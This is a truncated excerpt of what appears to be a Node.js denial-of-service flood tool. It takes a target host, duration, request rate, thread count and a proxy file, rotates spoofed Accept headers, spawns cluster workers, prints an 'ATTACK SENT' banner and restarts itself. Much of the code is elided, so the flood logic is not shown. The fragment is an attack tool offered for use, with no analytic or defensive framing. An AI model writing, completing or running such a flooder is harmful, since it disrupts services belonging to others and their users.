...
const accept_header = [
    ...
    'image/webp, image/apng, image/*;q=0.8, */*;q=0.5',
    'text/plain, application/json, */*;q=0.8',
    'application/xml, */*;q=0.5',
    'application/json',
    'application/json, application/vnd.api+json',
    'video/mp4, video/x-ms-wmv, */*;q=0.8',
    'image/png, application/pdf, */*;q=0.8',
...
const secureOptions =
 ...
 if (process.argv.length < 7){console.log(`Usage: Host Time Rate(32) Thread(4) ProxyFile.`); process.exit();}
...
const RESTART_DELAY = 1000;
 ...
 if (cluster.isMaster) {
  console.clear()
  console.log('ATTACK SENT'.bgBlue);
  console.log(' NEW TLS-TUR METHODS'.yellow);
  console.log('====================================='.gray);
    const restartScript = () => {
        ...
        console.log('Restarting The Script', RESTART_DELAY, '');
        setTimeout(() => {
